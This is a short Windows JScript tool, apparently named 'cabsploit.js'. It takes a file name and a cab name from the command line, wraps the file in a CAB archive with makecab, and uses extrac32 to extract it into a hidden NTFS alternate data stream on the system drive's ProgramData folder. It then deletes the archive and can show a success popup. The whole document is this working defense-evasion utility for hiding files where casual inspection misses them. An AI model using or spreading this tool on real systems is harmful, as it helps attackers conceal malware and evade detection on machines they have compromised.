var args = WScript.Arguments;
var shl = new ActiveXObject("WScript.Shell");
var fs = new ActiveXObject("Scripting.FileSystemObject");
if (args.Item(0) == "-h"){
shl.Popup("Usage:\ncabsploit.js -e filename cabname showresult", 0, "Usage");
}
if (args.Item(0) == "-e"){
var pdata = shl.ExpandEnvironmentStrings("%systemdrive%");
shl.Run("makecab " + args.Item(1) + " " + args.Item(2) + ".cab", 0, true);
shl.Run("extrac32 /E " + args.Item(2) + ".cab" + " /L " + pdata + "\\ProgramData:", 0, true);
fs.DeleteFile(args.Item(2) + ".cab");
if (args.Item(3) == "1"){
shl.Popup("Extracted to programdata ADS", 0, "Success");
}
else
{
//NO_RESULT
}
}